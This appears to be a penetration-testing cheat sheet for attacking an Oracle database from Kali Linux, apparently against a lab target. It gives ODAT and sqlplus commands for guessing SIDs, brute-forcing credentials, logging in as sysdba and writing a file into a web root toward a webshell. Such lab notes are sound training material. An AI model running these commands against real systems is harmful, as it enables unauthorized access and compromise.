Interact with Oracle from Kali Box
Tools required
-   `sqlplus`
    -   from [this github](https://github.com/bumpx/oracle-instantclient), download three files:
        -   basic, sdk, and sqlplus
    -   unzip them all into a Directory
    -   update bashrc:
        
        ```bash
        alias sqlplus='/opt/oracle/instantclient_12_2/sqlplus'
        export PATH=/root/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/opt/didier:/usr/local/go/bin’
        export SQLPATH=/opt/oracle/instantclient_12_2
        export TNS_ADMIN=/opt/oracle/instantclient_12_2
        export LD_LIBRARY_PATH=/opt/oracle/instantclient_12_2
        export ORACLE_HOME=/opt/oracle/instantclient_12_2
        ```
        
-   Oracle Database Attacking Tool (ODAT)
    -   download release from github: https://github.com/quentinhardy/odat/releases/
    -   unzip in `/opt`
    -   added line to `~/.bashrc`: `alias odat='export LD_LIBRARY_PATH=/opt/odat-libc2.5-i686/; cd /opt/odat-libc2.5-i686/; ./odat-libc2.5-i686; cd -'`
    -   There are detailed instructions on the github readme.
-   metasploit
    
    -   use this walkthrough: https://blog.zsec.uk/msforacle/


# Attack Methodology

### Step 1:
Identify the database

### Step 2:
We need one valid SID, which we can get with `odat` or `metasploit`
###### odat
```bash
odat sidguesser -s 10.10.10.82
```

### Step 3:
Bruteforce User and Password using `odat`
###### odat
```bash
# -d is SID we found in step2
odat.py passwordguesser -d XE -s 10.10.10.82 -p 1521 --accounts-files users-oracle.txt pass-oracle.txt -vv
```

### Step 4:
Connect with database using creds found in Step3.
```bash
# Syntax
sqlplus Username/password@IP:Port/SID

# Example
sqlplus SCOTT/tiger@10.10.10.82:1521/XE
```

### Step 5:
Privilege escalation of current user
Connect with `sysdba` 
```bash
sqlplus SCOTT/tiger@10.10.10.82:1521/XE as sysdba
```

```sql
select * from users_role_privs;
```

Now we know that sysdba has privs so scanning again with it.
```bash
odat all -s 10.10.10.82 -d XE -U SCOTT -P tiger --sysdba
```

![odat](https://0xdf.gitlab.io/img/ODAT_main_features_v2.0.jpg)

# Getting Webshell 
```bash
odat dbmsadvisor -s 10.10.10.82 -d XE -U SCOTT -P tiger --sysdba --putFile C:\\inetpub\\wwwroot 0xdf.txt <(echo 0xdf was here)

curl http://10.10.10.82/0xdf.txt
```

